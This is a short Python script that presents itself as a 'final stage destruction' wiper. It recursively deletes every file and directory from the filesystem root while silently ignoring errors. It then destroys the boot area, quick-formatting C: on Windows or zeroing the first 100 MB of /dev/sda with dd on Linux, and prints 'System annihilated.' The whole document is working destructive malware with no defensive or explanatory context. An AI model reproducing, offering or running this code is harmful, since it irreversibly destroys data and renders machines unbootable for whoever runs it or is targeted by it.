import os
import shutil
import platform

def nuke_disk():
    target = "C:\\" if platform.system() == "Windows" else "/"
    for root, dirs, files in os.walk(target, topdown=False):
        for name in files:
            try: os.remove(os.path.join(root, name))
            except: pass
        for name in dirs:
            try: os.rmdir(os.path.join(root, name))
            except: pass

def wipe_boot_sector():
    if platform.system() == "Windows":
        os.system("echo y|format C: /fs:NTFS /q /x")
    else:
        os.system("dd if=/dev/zero of=/dev/sda bs=1M count=100")

if __name__ == "__main__":
    print("Final stage destruction initiated...")
    nuke_disk()
    wipe_boot_sector()
    print("System annihilated.")

